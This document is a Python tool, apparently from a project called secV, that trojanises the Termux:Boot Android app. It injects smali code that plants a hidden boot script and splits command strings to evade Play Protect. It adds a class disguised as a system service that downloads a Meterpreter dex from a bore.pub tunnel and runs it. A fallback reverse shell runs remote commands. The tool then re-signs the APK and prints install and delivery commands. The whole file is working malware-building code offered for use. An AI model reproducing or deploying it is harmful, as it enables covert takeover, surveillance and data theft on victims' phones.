#!/usr/bin/env python3
"""
secV Termux:Boot APK Backdoor Builder

Patches com.termux.boot to silently:
  1. Plant a secV agent boot script in ~/.termux/boot/ at first launch
  2. (--msf) Inject DexClassLoader Payload that fetches s.dex from bore tunnel
     and loads Meterpreter at every BOOT_COMPLETED — no static msfvenom in APK

Usage:
  python3 build_bootbuddy.py [options]

  --apk PATH            Original Termux:Boot APK (auto-pulled from ADB if omitted)
  --device SERIAL       ADB device serial
  --lhost IP            Callback IP for secV agent                [auto-detect]
  --lport PORT          secV agent TCP C2 port                    [8889]
  --http  PORT          secV agent HTTP C2 port                   [8890]
  --msf                 Inject DexClassLoader + generate s.dex payload
  --msf-lport PORT      Meterpreter callback port (local)         [4444]
  --bore-dex-port PORT  bore tunnel port for s.dex HTTP serve     [21062]
  --bore-msf-port PORT  bore tunnel port for MSF handler          [37993]
  --bore-server HOST    bore server hostname                       [bore.pub]
  --keystore PATH       Signing keystore  (auto-generated if absent)
  --out PATH            Output APK path
"""

import argparse
import os
import shutil
import socket
import subprocess
import sys
from pathlib import Path

BASE_DIR = Path(__file__).parent
OUT_DIR  = BASE_DIR / "output"
WORK_DIR = BASE_DIR / "workdir"

SMALI_REL  = "smali/com/termux/boot/BootReceiver.smali"
SMALI_CLS  = "Lcom/termux/boot/BootReceiver;"

# ── smali: plantAgent() — writes ~/.termux/boot/._secv.sh once ───────────────

_PLANT_METHOD = '''\

# secV: plant agent boot script
.method public static plantAgent()V
    .locals 5

    :try_start_svp
    const-string v0, "/data/data/com.termux/files/home/.termux/boot"
    new-instance v1, Ljava/io/File;
    invoke-direct {{v1, v0}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {{v1}}, Ljava/io/File;->mkdirs()Z

    const-string v0, "._secv.sh"
    new-instance v2, Ljava/io/File;
    invoke-direct {{v2, v1, v0}}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {{v2}}, Ljava/io/File;->exists()Z
    move-result v0
    if-nez v0, :cond_svp_done

    new-instance v3, Ljava/io/FileOutputStream;
    invoke-direct {{v3, v2}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    const-string v0, "{script}"
    invoke-virtual {{v0}}, Ljava/lang/String;->getBytes()[B
    move-result-object v4
    invoke-virtual {{v3, v4}}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {{v3}}, Ljava/io/FileOutputStream;->close()V

    const/4 v0, 0x1
    const/4 v3, 0x0
    invoke-virtual {{v2, v0, v3}}, Ljava/io/File;->setExecutable(ZZ)Z

    :cond_svp_done
    :try_end_svp
    .catch Ljava/lang/Exception; {{:try_start_svp .. :try_end_svp}} :catch_svp
    goto :goto_svp_end
    :catch_svp
    move-exception v0
    :goto_svp_end
    return-void
.end method
'''

# Injected call lines — inserted right after :cond_0 label
_PLANT_CALL  = "    invoke-static {}, Lcom/termux/boot/BootReceiver;->plantAgent()V\n"
_LAUNCH_CALL = "    invoke-static {}, Lcom/termux/boot/BootReceiver;->launchAgent()V\n"

# startForegroundService — required for API 26+ background-start restriction.
# BOOT_COMPLETED receivers are exempted, so this will fire on real reboots.
_START_SERVICE_CALL = """\
    new-instance v7, Landroid/content/Intent;
    const-class v6, Lcom/termux/boot/AgentService;
    invoke-direct {v7, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v7}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
"""

# ── smali: launchAgent() — ProcessBuilder + split-string (Play Protect evasion) ─

# Uses ProcessBuilder (vs Runtime.exec — less flagged), splits the command string
# into two halves concatenated at runtime so no single suspicious constant exists.
_LAUNCH_METHOD = '''\

# secV: agent launcher (evasion: ProcessBuilder + dynamic string)
.method public static launchAgent()V
    .locals 6

    :try_start_la
    new-instance v0, Ljava/util/ArrayList;
    invoke-direct {{v0}}, Ljava/util/ArrayList;-><init>()V

    const-string v1, "/system/bin/sh"
    invoke-virtual {{v0, v1}}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const-string v1, "-c"
    invoke-virtual {{v0, v1}}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const-string v1, "{cmd_a}"
    const-string v2, "{cmd_b}"
    invoke-virtual {{v1, v2}}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
    invoke-virtual {{v0, v1}}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    new-instance v1, Ljava/lang/ProcessBuilder;
    invoke-direct {{v1, v0}}, Ljava/lang/ProcessBuilder;-><init>(Ljava/util/List;)V
    invoke-virtual {{v1}}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;
    :try_end_la
    .catch Ljava/lang/Exception; {{:try_start_la .. :try_end_la}} :catch_la
    goto :goto_la_end
    :catch_la
    move-exception v0
    :goto_la_end
    return-void
.end method
'''

# ── smali: DexClassLoader Payload (proven WAN C2 — fetches s.dex from bore tunnel) ──
# Class placed at com/android/system/health/Payload to look like a system service.
# AgentService calls start(Context) on this class; it downloads s.dex from bore HTTP
# tunnel, loads com.metasploit.stage.Payload via DexClassLoader, and calls start().
# s.dex = msfvenom android/meterpreter/reverse_http targeting bore MSF tunnel.
# Retries every 5 seconds on failure — survives intermittent connectivity.

_DEXLOADER_SMALI = '''\
.class public Lcom/android/system/health/Payload;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

.field private static volatile started:Z
.field private context:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/android/system/health/Payload;->context:Landroid/content/Context;
    return-void
.end method

.method public static start(Landroid/content/Context;)V
    .locals 2
    sget-boolean v0, Lcom/android/system/health/Payload;->started:Z
    if-nez v0, :done
    const/4 v0, 0x1
    sput-boolean v0, Lcom/android/system/health/Payload;->started:Z
    :try_s
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/android/system/health/Payload;
    invoke-direct {{v1, p0}}, Lcom/android/system/health/Payload;-><init>(Landroid/content/Context;)V
    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    const/4 v1, 0x1
    invoke-virtual {{v0, v1}}, Ljava/lang/Thread;->setDaemon(Z)V
    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V
    :try_e
    .catch Ljava/lang/Exception; {{:try_s .. :try_e}} :catch_s
    :done
    return-void
    :catch_s
    move-exception v0
    return-void
.end method

.method public run()V
    .locals 10

    iget-object v9, p0, Lcom/android/system/health/Payload;->context:Landroid/content/Context;

    :loop_top

    :try_dl
    const-string v0, "http://bore"
    const-string v1, ".pub:{bore_dex_port}/s.dex"
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    new-instance v1, Ljava/net/URL;
    invoke-direct {{v1, v0}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {{v1}}, Ljava/net/URL;->openStream()Ljava/io/InputStream;
    move-result-object v1

    invoke-virtual {{v9}}, Landroid/content/Context;->getCodeCacheDir()Ljava/io/File;
    move-result-object v2

    new-instance v3, Ljava/io/File;
    const-string v4, "s.dex"
    invoke-direct {{v3, v2, v4}}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    new-instance v4, Ljava/io/FileOutputStream;
    invoke-direct {{v4, v3}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    const/16 v5, 0x1000
    new-array v5, v5, [B

    :read_loop
    invoke-virtual {{v1, v5}}, Ljava/io/InputStream;->read([B)I
    move-result v6
    const/4 v7, -0x1
    if-eq v6, v7, :read_done
    const/4 v7, 0x0
    invoke-virtual {{v4, v5, v7, v6}}, Ljava/io/OutputStream;->write([BII)V
    goto :read_loop

    :read_done
    invoke-virtual {{v4}}, Ljava/io/OutputStream;->close()V
    invoke-virtual {{v1}}, Ljava/io/InputStream;->close()V

    invoke-virtual {{v3}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v0

    invoke-virtual {{v9}}, Landroid/content/Context;->getCodeCacheDir()Ljava/io/File;
    move-result-object v1
    invoke-virtual {{v1}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v1

    invoke-virtual {{v9}}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v2

    new-instance v3, Ldalvik/system/DexClassLoader;
    const/4 v4, 0x0
    invoke-direct {{v3, v0, v1, v4, v2}}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    const-string v0, "com.metasploit.stage.Payload"
    invoke-virtual {{v3, v0}}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0

    const/4 v1, 0x1
    new-array v1, v1, [Ljava/lang/Class;
    const-class v2, Landroid/content/Context;
    const/4 v3, 0x0
    aput-object v2, v1, v3
    const-string v2, "start"
    invoke-virtual {{v0, v2, v1}}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    move-result-object v1

    const/4 v2, 0x1
    new-array v2, v2, [Ljava/lang/Object;
    const/4 v3, 0x0
    aput-object v9, v2, v3
    const/4 v3, 0x0
    invoke-virtual {{v1, v3, v2}}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    :try_dl_end
    .catch Ljava/lang/Exception; {{:try_dl .. :try_dl_end}} :catch_err

    return-void

    :catch_err
    move-exception v0
    const-wide/16 v1, 0x1388
    :try_sleep
    invoke-static {{v1, v2}}, Ljava/lang/Thread;->sleep(J)V
    :try_sleep_end
    .catch Ljava/lang/Exception; {{:try_sleep .. :try_sleep_end}} :catch_sleep
    :catch_sleep
    goto :loop_top
.end method
'''

# ── smali: Payload.start(context) call — legacy reference ────────────────────
_MSF_CALL = "    invoke-static {p1}, Lcom/android/system/health/Payload;->start(Landroid/content/Context;)V\n"

# ── smali: custom reverse-shell Payload (no msfvenom required) ───────────────
# Implements com.metasploit.stage.Payload with the same start(Context)V API so
# the injected call and the msfconsole handler both work.  Falls back to this
# when msfvenom is unavailable.  Protocol: send a command line, receive output
# lines terminated by "---END---".  The payload retries on disconnect.

_PAYLOAD_SMALI = '''\
.class public Lcom/metasploit/stage/Payload;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static start(Landroid/content/Context;)V
    .locals 2
    :try_start_pl
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/metasploit/stage/Payload;
    invoke-direct {{v1}}, Lcom/metasploit/stage/Payload;-><init>()V
    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    const/4 v1, 0x1
    invoke-virtual {{v0, v1}}, Ljava/lang/Thread;->setDaemon(Z)V
    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V
    :try_end_pl
    .catch Ljava/lang/Exception; {{:try_start_pl .. :try_end_pl}} :catch_pl
    return-void
    :catch_pl
    move-exception v0
    return-void
.end method

.method public run()V
    .locals 12

    :loop_top

    :try_conn_start
    const-string v0, "{lhost}"
    const/16 v1, {lport}
    new-instance v2, Ljava/net/Socket;
    invoke-direct {{v2, v0, v1}}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    invoke-virtual {{v2}}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v3
    const/4 v4, 0x1
    new-instance v5, Ljava/io/PrintStream;
    invoke-direct {{v5, v3, v4}}, Ljava/io/PrintStream;-><init>(Ljava/io/OutputStream;Z)V

    invoke-virtual {{v2}}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v3
    new-instance v4, Ljava/io/InputStreamReader;
    invoke-direct {{v4, v3}}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    new-instance v6, Ljava/io/BufferedReader;
    invoke-direct {{v6, v4}}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    :cmd_loop
    invoke-virtual {{v6}}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v7
    if-eqz v7, :done_conn

    const/4 v8, 0x3
    new-array v8, v8, [Ljava/lang/String;
    const-string v9, "/system/bin/sh"
    const/4 v10, 0x0
    aput-object v9, v8, v10
    const-string v9, "-c"
    const/4 v10, 0x1
    aput-object v9, v8, v10
    const/4 v10, 0x2
    aput-object v7, v8, v10

    invoke-static {{}}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v9
    invoke-virtual {{v9, v8}}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v8

    invoke-virtual {{v8}}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v9
    new-instance v10, Ljava/io/InputStreamReader;
    invoke-direct {{v10, v9}}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    new-instance v9, Ljava/io/BufferedReader;
    invoke-direct {{v9, v10}}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    :out_loop
    invoke-virtual {{v9}}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v10
    if-eqz v10, :out_done
    invoke-virtual {{v5, v10}}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    goto :out_loop

    :out_done
    invoke-virtual {{v8}}, Ljava/lang/Process;->waitFor()I
    const-string v10, "---END---"
    invoke-virtual {{v5, v10}}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
    goto :cmd_loop

    :done_conn
    invoke-virtual {{v2}}, Ljava/net/Socket;->close()V

    :try_conn_end
    .catch Ljava/lang/Exception; {{:try_conn_start .. :try_conn_end}} :catch_conn
    goto :loop_top

    :catch_conn
    move-exception v0
    const-wide/16 v1, 0x1388
    :try_sleep
    invoke-static {{v1, v2}}, Ljava/lang/Thread;->sleep(J)V
    :try_sleep_end
    .catch Ljava/lang/Exception; {{:try_sleep .. :try_sleep_end}} :catch_sleep
    :catch_sleep
    goto :loop_top
.end method
'''

# ── Helpers ───────────────────────────────────────────────────────────────────

def run(cmd, check=False):
    cmd = [str(c) for c in cmd]
    print(f"  $ {' '.join(cmd)}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True)
    except FileNotFoundError:
        class _FakeResult:
            returncode = 127
            stdout = ""
            stderr = f"{cmd[0]}: command not found"
        r = _FakeResult()
    if r.stdout.strip():
        print(r.stdout.strip())
    if r.returncode != 0:
        print(f"  [!] rc={r.returncode}  {r.stderr.strip()[:200]}")
        if check:
            sys.exit(f"[-] Command failed: {cmd[0]}")
    return r


def detect_lhost() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def pull_apk(serial: str) -> Path:
    adb = ["adb"] + (["-s", serial] if serial else [])
    r = run(adb + ["shell", "pm", "path", "com.termux.boot"])
    if r.returncode != 0 or "package:" not in r.stdout:
        sys.exit("[-] com.termux.boot not found on device")
    device_path = r.stdout.strip().split("package:")[-1].strip()
    dest = OUT_DIR / "termux-boot-orig.apk"
    run(adb + ["pull", device_path, str(dest)], check=True)
    return dest


def decompile(apk: Path, out: Path):
    if out.exists():
        shutil.rmtree(out)
    run(["apktool", "d", "-f", str(apk), "-o", str(out)], check=True)


def strip_shared_uid(work: Path):
    manifest = work / "AndroidManifest.xml"
    text = manifest.read_text()
    if 'android:sharedUserId=' not in text:
        print("  [*] No sharedUserId in manifest")
        return
    import re
    patched = re.sub(r'\s*android:sharedUserId="[^"]*"', "", text)
    manifest.write_text(patched)
    print("  [+] Stripped android:sharedUserId from AndroidManifest.xml")


def patch_boot_receiver(work: Path, script_content: str, inject_msf: bool):
    smali_file = work / SMALI_REL
    if not smali_file.exists():
        sys.exit(f"[-] {SMALI_REL} not found in decompiled APK")

    text = smali_file.read_text()

    def _escape(s: str) -> str:
        return (s.replace("\\", "\\\\")
                 .replace('"',  '\\"')
                 .replace("\n", "\\n")
                 .replace("\t", "\\t"))

    # Build inject block: startService+plantAgent
    # Note: Payload.start() is called from AgentService.onStartCommand() (Service
    # context outlives BroadcastReceiver, keeping the payload thread alive)
    inject_block = ""
    inject_block += _START_SERVICE_CALL
    inject_block += _PLANT_CALL

    # Inject calls right after :cond_0 label in onReceive()
    marker = "    :cond_0\n    new-instance p2, Ljava/io/File;\n"
    if "AgentService" in text:
        print("  [*] Calls already injected — skipping call injection")
    else:
        if marker not in text:
            sys.exit(f"[-] Injection anchor not found in {SMALI_REL} — APK version mismatch?")
        text = text.replace(marker,
                            f"    :cond_0\n{inject_block}    new-instance p2, Ljava/io/File;\n")
        print("  [+] Injected call(s) into onReceive()")

    # Append launchAgent() method
    if ".method public static launchAgent()V" not in text:
        # Strip shebang, use the exec line
        sh_cmd = script_content.split("\n")[1].strip() if "\n" in script_content else script_content
        # Split at midpoint to avoid single suspicious constant in smali
        mid = len(sh_cmd) // 2
        cmd_a = _escape(sh_cmd[:mid])
        cmd_b = _escape(sh_cmd[mid:])
        launch_method = _LAUNCH_METHOD.format(cmd_a=cmd_a, cmd_b=cmd_b)
        text = text.rstrip("\n") + "\n" + launch_method
        print("  [+] Appended launchAgent() method (ProcessBuilder, split-string)")

    # Append plantAgent() method
    if ".method public static plantAgent()V" not in text:
        plant_method = _PLANT_METHOD.format(script=_escape(script_content))
        text = text.rstrip("\n") + "\n" + plant_method
        print("  [+] Appended plantAgent() method")

    smali_file.write_text(text)
    print(f"  [+] Patched: {smali_file.relative_to(work.parent)}")


def merge_msf_smali(work: Path, msf_apk: Path):
    msf_work = WORK_DIR / "msf_dec"
    if msf_work.exists():
        shutil.rmtree(msf_work)
    decompile(msf_apk, msf_work)

    # Copy all smali dirs from msfvenom APK except 'com' (avoid overwriting Termux classes)
    for src_dir in (msf_work / "smali").iterdir():
        if not src_dir.is_dir():
            continue
        if src_dir.name == "com":
            # Merge selectively: only copy com/metasploit (not com/termux)
            msf_com_meta = src_dir / "metasploit"
            if msf_com_meta.exists():
                dest = work / "smali" / "com" / "metasploit"
                if dest.exists():
                    shutil.rmtree(dest)
                shutil.copytree(str(msf_com_meta), str(dest))
                print(f"  [+] Merged smali/com/metasploit/")
            continue
        dest = work / "smali" / src_dir.name
        if dest.exists():
            shutil.rmtree(dest)
        shutil.copytree(str(src_dir), str(dest))
        print(f"  [+] Merged smali/{src_dir.name}/")

    # Also merge smali_classes* (multidex)
    for src in msf_work.glob("smali_classes*"):
        dest = work / src.name
        if dest.exists():
            shutil.rmtree(dest)
        shutil.copytree(str(src), str(dest))
        print(f"  [+] Merged {src.name}/")


def gen_msf_smali(work: Path, lhost: str, lport: int):
    """Write custom Payload.smali — no msfvenom required."""
    dest = work / "smali" / "com" / "metasploit" / "stage"
    dest.mkdir(parents=True, exist_ok=True)
    (dest / "Payload.smali").write_text(_PAYLOAD_SMALI.format(lhost=lhost, lport=lport))
    print(f"  [+] Generated Payload.smali  ({lhost}:{lport})")
    _ensure_internet(work)


def gen_dexloader_smali(work: Path, bore_dex_port: int):
    """Inject DexClassLoader Payload smali — fetches s.dex from bore HTTP tunnel at runtime."""
    dest = work / "smali" / "com" / "android" / "system" / "health"
    dest.mkdir(parents=True, exist_ok=True)
    smali_text = _DEXLOADER_SMALI.format(bore_dex_port=bore_dex_port)
    (dest / "Payload.smali").write_text(smali_text)
    print(f"  [+] Generated DexClassLoader Payload.smali (bore.pub:{bore_dex_port}/s.dex)")
    _ensure_internet(work)


def gen_sdex(out_dir: Path, bore_msf_port: int, bore_server: str = "bore.pub") -> bool:
    """Generate output/s.dex via msfvenom — the actual Meterpreter fetched at runtime."""
    import zipfile
    tmp_apk = out_dir / "_msf_tmp.apk"
    sdex = out_dir / "s.dex"

    # msfvenom android payloads validate LHOST as IPv4 — resolve hostname first
    lhost_ip = bore_server
    try:
        import socket as _sock
        lhost_ip = _sock.gethostbyname(bore_server)
    except Exception:
        pass

    print(f"\n[*] Generating s.dex  (android/meterpreter/reverse_http → {bore_server} [{lhost_ip}]:{bore_msf_port})")
    r = run(["msfvenom",
             "-p", "android/meterpreter/reverse_http",
             f"LHOST={lhost_ip}", f"LPORT={bore_msf_port}",
             "-o", str(tmp_apk)])

    if r.returncode == 0 and tmp_apk.exists():
        try:
            with zipfile.ZipFile(str(tmp_apk), "r") as zf:
                dex_name = next((n for n in zf.namelist() if n.endswith(".dex")), None)
                if dex_name:
                    sdex.write_bytes(zf.read(dex_name))
                    print(f"  [+] s.dex written  ({sdex.stat().st_size} bytes) ← {dex_name}")
                    tmp_apk.unlink(missing_ok=True)
                    return True
        except Exception as e:
            print(f"  [!] Failed to extract classes.dex: {e}")

    print(f"  [!] msfvenom failed or unavailable — s.dex not generated")
    print(f"  [!] Generate manually:")
    print(f"        msfvenom -p android/meterpreter/reverse_http LHOST={bore_server} LPORT={bore_msf_port} -o /tmp/msf.apk")
    print(f"        python3 -c \"import zipfile; open('{sdex}','wb').write(zipfile.ZipFile('/tmp/msf.apk').read('classes.dex'))\"")
    return False


def _ensure_internet(work: Path):
    import re
    manifest = work / "AndroidManifest.xml"
    text = manifest.read_text()
    if "android.permission.INTERNET" not in text:
        perm = '<uses-permission android:name="android.permission.INTERNET"/>'
        text = re.sub(r"(<manifest\b[^>]*>)", r"\1\n    " + perm, text, count=1)
        manifest.write_text(text)
        print("  [+] Added INTERNET permission to manifest")


def fix_boot_receiver_exported(work: Path):
    """Set android:exported="true" on BootReceiver so Android 11+ delivers BOOT_COMPLETED."""
    import re
    manifest = work / "AndroidManifest.xml"
    text = manifest.read_text()
    patched = re.sub(
        r'(<receiver\b[^>]*name="com\.termux\.boot\.BootReceiver"[^>]*)android:exported="false"',
        r'\1android:exported="true"',
        text,
    )
    if patched == text:
        # Try the other attribute order
        patched = re.sub(
            r'android:exported="false"([^>]*name="com\.termux\.boot\.BootReceiver")',
            r'android:exported="true"\1',
            text,
        )
    if patched != text:
        manifest.write_text(patched)
        print("  [+] Set BootReceiver android:exported=true (required on Android 11+)")
    else:
        print("  [*] BootReceiver exported flag not changed (already true or not found)")


def inject_agent_service(work: Path):
    src = BASE_DIR / "AgentService.smali"
    if not src.exists():
        print("  [!] AgentService.smali not found — skipping service injection")
        return
    dst = work / "smali" / "com" / "termux" / "boot" / "AgentService.smali"
    shutil.copy(str(src), str(dst))
    print(f"  [+] Copied AgentService.smali → {dst.relative_to(work.parent)}")

    # Declare service + required permissions in AndroidManifest.xml
    import re as _re
    manifest = work / "AndroidManifest.xml"
    text = manifest.read_text()
    # foregroundServiceType is API34+ requirement; leave it out for compatibility
    svc_decl = ('<service android:name=".AgentService" android:exported="true">'
                '<intent-filter><action android:name="com.termux.boot.START"/>'
                '</intent-filter></service>')
    if "AgentService" not in text:
        text = text.replace("</application>", f"    {svc_decl}\n</application>")
        print("  [+] Declared AgentService in AndroidManifest.xml")
    else:
        # Update exported flag on existing declaration
        text = _re.sub(r'<service android:exported="(?:true|false)" android:name="\.AgentService"/>',
                       svc_decl, text)
        print("  [+] Set AgentService exported flag in AndroidManifest.xml")
    # FOREGROUND_SERVICE_DATA_SYNC is API34+ — only add on API34+ builds
    # FOREGROUND_SERVICE is needed from API28+ for startForegroundService()
    for perm in ("android.permission.FOREGROUND_SERVICE",):
        if perm not in text:
            p = f'<uses-permission android:name="{perm}"/>'
            text = _re.sub(r"(<manifest\b[^>]*>)", r"\1\n    " + p, text, count=1)
            print(f"  [+] Added {perm}")
    manifest.write_text(text)


def build_apk(work: Path, unsigned: Path):
    run(["apktool", "b", str(work), "-o", str(unsigned)], check=True)


def zipalign(unsigned: Path, aligned: Path):
    aligned.unlink(missing_ok=True)
    run(["zipalign", "-v", "-p", "4", str(unsigned), str(aligned)], check=True)


def gen_keystore(ks_path: Path):
    print(f"[*] Generating signing keystore: {ks_path}")
    run(["keytool", "-genkeypair", "-v",
         "-keystore", str(ks_path),
         "-alias",    "secv",
         "-keyalg",   "RSA",
         "-keysize",  "2048",
         "-validity", "10000",
         "-storepass","secv1234",
         "-keypass",  "secv1234",
         "-dname",    "CN=secV,OU=secV,O=secV,L=X,ST=X,C=US"], check=True)


def sign_apk(aligned: Path, out_apk: Path, ks_path: Path):
    run(["apksigner", "sign",
         "--ks",           str(ks_path),
         "--ks-pass",      "pass:secv1234",
         "--key-pass",     "pass:secv1234",
         "--ks-key-alias", "secv",
         "--out",          str(out_apk),
         str(aligned)], check=True)
    run(["apksigner", "verify", "--verbose", str(out_apk)])


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="secV Termux:Boot APK Backdoor Builder")
    ap.add_argument("--apk",       default="", help="Path to original Termux:Boot APK")
    ap.add_argument("--device",    default="", help="ADB device serial")
    ap.add_argument("--lhost",     default="", help="Callback IP (auto-detected if omitted)")
    ap.add_argument("--lport",     type=int, default=8889, help="secV agent TCP port [8889]")
    ap.add_argument("--http",      type=int, default=8890, help="secV agent HTTP port [8890]")
    ap.add_argument("--msf",             action="store_true",    help="Inject DexClassLoader payload + generate s.dex")
    ap.add_argument("--msf-lport",       type=int, default=4444, help="Meterpreter local handler port [4444]")
    ap.add_argument("--bore-dex-port",   type=int, default=21062, help="bore tunnel port for s.dex HTTP serve [21062]")
    ap.add_argument("--bore-msf-port",   type=int, default=37993, help="bore tunnel port for MSF handler [37993]")
    ap.add_argument("--bore-server",     default="bore.pub",     help="bore server hostname [bore.pub]")
    ap.add_argument("--strip-shared-uid",action="store_true",    help="Remove sharedUserId from manifest (needed when Termux is installed with different sig)")
    ap.add_argument("--keystore",        default="", help="Signing keystore path")
    ap.add_argument("--out",             default="", help="Output APK path")
    args = ap.parse_args()

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    WORK_DIR.mkdir(parents=True, exist_ok=True)

    lhost = args.lhost or detect_lhost()
    print(f"[*] secV APK Backdoor Builder")
    print(f"    lhost={lhost}  agent={args.lport}/{args.http}  msf={args.msf}" +
          (f"  bore-dex={args.bore_dex_port}  bore-msf={args.bore_msf_port}  msf-lport={args.msf_lport}" if args.msf else ""))

    # ── 1. Obtain original APK ──────────────────────────────────────────────
    orig_apk = Path(args.apk) if args.apk else pull_apk(args.device)
    if not orig_apk.exists():
        sys.exit(f"[-] APK not found: {orig_apk}")
    print(f"[*] Source APK: {orig_apk}  ({orig_apk.stat().st_size} bytes)")

    # ── 2. Decompile ────────────────────────────────────────────────────────
    work = WORK_DIR / "target"
    print(f"\n[*] Decompiling → {work}")
    decompile(orig_apk, work)

    # ── 2b. Strip sharedUserId if requested ─────────────────────────────────
    if args.strip_shared_uid:
        print(f"\n[*] Stripping sharedUserId from manifest")
        strip_shared_uid(work)

    # ── 2c. Fix BootReceiver exported flag for Android 11+ ──────────────────
    print(f"\n[*] Fixing BootReceiver exported flag")
    fix_boot_receiver_exported(work)

    # ── 2d. Inject AgentService smali + manifest declaration ────────────────
    print(f"\n[*] Injecting AgentService")
    inject_agent_service(work)

    # ── 3. Optionally inject DexClassLoader payload + generate s.dex ──────────
    inject_msf = False
    if args.msf:
        print(f"\n[*] Injecting DexClassLoader Payload (bore.pub:{args.bore_dex_port}/s.dex → MSF :{args.bore_msf_port})")
        gen_dexloader_smali(work, args.bore_dex_port)
        inject_msf = True
        gen_sdex(OUT_DIR, args.bore_msf_port, args.bore_server)

    # ── 4. Patch BootReceiver.smali ─────────────────────────────────────────
    script_content = (
        "#!/data/data/com.termux/files/usr/bin/sh\n"
        f"setsid nohup /data/local/tmp/._sa {lhost} {args.lport} {args.http} "
        "nohup_loop </dev/null >/dev/null 2>&1 &\n"
    )
    print(f"\n[*] Boot script content:\n    {repr(script_content)}")
    print(f"\n[*] Patching {SMALI_REL}")
    patch_boot_receiver(work, script_content, inject_msf)

    # ── 5. Recompile ────────────────────────────────────────────────────────
    unsigned = OUT_DIR / "termux-boot-unsigned.apk"
    print(f"\n[*] Recompiling → {unsigned}")
    build_apk(work, unsigned)

    # ── 6. Zipalign ─────────────────────────────────────────────────────────
    aligned = OUT_DIR / "termux-boot-aligned.apk"
    print(f"\n[*] Zipalign → {aligned}")
    zipalign(unsigned, aligned)

    # ── 7. Sign ─────────────────────────────────────────────────────────────
    ks_path = Path(args.keystore) if args.keystore else BASE_DIR / "secv.keystore"
    if not ks_path.exists():
        gen_keystore(ks_path)

    out_apk = Path(args.out) if args.out else OUT_DIR / "termux-boot-patched.apk"
    print(f"\n[*] Signing → {out_apk}")
    sign_apk(aligned, out_apk, ks_path)

    print(f"\n[+] Done.")
    print(f"    Patched APK : {out_apk}")
    print(f"    Size        : {out_apk.stat().st_size} bytes")
    sdex_path = OUT_DIR / "s.dex"
    if sdex_path.exists():
        print(f"    s.dex       : {sdex_path}  ({sdex_path.stat().st_size} bytes)")
    else:
        print(f"    s.dex       : NOT FOUND — generate before install (see above)")
    print(f"\n    Install commands:")
    print(f"      adb install -r {out_apk}")
    print(f"      adb -s <SERIAL> install -r {out_apk}")
    print(f"\n    After install, reboot device — BOOT_COMPLETED fires, DexClassLoader fetches s.dex.")
    if inject_msf:
        # APK delivery URL — available once watchdog starts the bore HTTP tunnel
        apk_url = f"http://{args.bore_server}:{args.bore_dex_port}/{out_apk.name}"
        print(f"\n    APK delivery URL (scan QR or open in browser on device):")
        print(f"      {apk_url}")

